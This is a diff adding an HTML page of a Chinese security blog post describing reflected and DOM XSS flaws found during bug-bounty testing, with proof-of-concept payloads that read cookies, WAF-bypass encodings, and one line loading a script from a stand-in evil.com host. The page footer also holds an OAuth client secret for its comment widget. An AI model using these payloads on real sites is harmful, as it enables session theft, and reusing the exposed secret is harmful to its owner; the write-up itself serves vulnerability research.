@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            SRC挖掘初探之随缘XSS挖掘
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/"> 
+                    SRC挖掘初探之随缘XSS挖掘 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-04-05   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/论坛文章/">论坛文章</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#登陆跳转处XSS"><span class="toc-list-text">登陆跳转处XSS</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Image处的XSS"><span class="toc-list-text">Image处的XSS</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#邮件提交处的XSS"><span class="toc-list-text">邮件提交处的XSS</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#一个受阻的XSS"><span class="toc-list-text">一个受阻的XSS</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#自闭总结"><span class="toc-list-text">自闭总结</span></a></li></ol>
+</div>
+            <div class="content">
+                <p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p>
+<p>Author:Hpdoger@D0g3</p>
+<p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p>
+<p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p>
+<h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p>
+<p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p>
+<p>其中,getparam方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getParam: function(c_name) &#123;</span><br><span class="line">    var urlParams = location.href;</span><br><span class="line">    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€</span><br><span class="line">    if (c_start != -1) &#123;</span><br><span class="line">        c_start = c_start + c_name.length + 1;銆€</span><br><span class="line">        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);</span><br><span class="line">        if (c_end == -1) &#123;</span><br><span class="line">            c_end = urlParams.length;</span><br><span class="line">        &#125;</span><br><span class="line">        return urlParams.substring(c_start, c_end);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p>
+<p>POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cb=javascript:alert(document.cookie);//normal.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p>
+<h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p>
+<p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p>
+<p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p>
+<p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST xxxx?q=index/feedback HTTP/1.1</span><br><span class="line"></span><br><span class="line">imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</span><br></pre></td></tr></table></figure>
+
+<p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p>
+<p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p>
+<p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p>
+<h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p>
+<p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p>
+<p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p>
+<p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p>
+<ol>
+<li>email字符串长度&lt;40且@结尾</li>
+<li>不能同时出现两个双引号、括号</li>
+<li>正则alert(1)\prompt(1)\confim…</li>
+</ol>
+<p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&apos;xss&apos;&amp;#41&amp;#34@qq.com)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p>
+<p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p>
+<p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p>
+<h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p>
+<p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p>
+<p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p>
+<p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p>
+<p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</span><br></pre></td></tr></table></figure>
+
+<p>在进一步的探索中，我做了两个尝试：</p>
+<ol>
+<li>尝试跳一个外域的JS，看能不能把src属性转到这个js<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></p>
+<ol start="2">
+<li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></p>
+<p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p>
+<h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p>
+<p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/04/05/SRC挖掘初探之随缘XSS挖掘/">https://hpdoger.cn/2019/04/05/SRC挖掘初探之随缘XSS挖掘/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/04/08/西湖论剑2019-Writeup/">  西湖论剑2019-Writeup</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/"> Ubuntu16.04-子域名监控工具Getdomain环境搭建 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Fri Apr 05 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
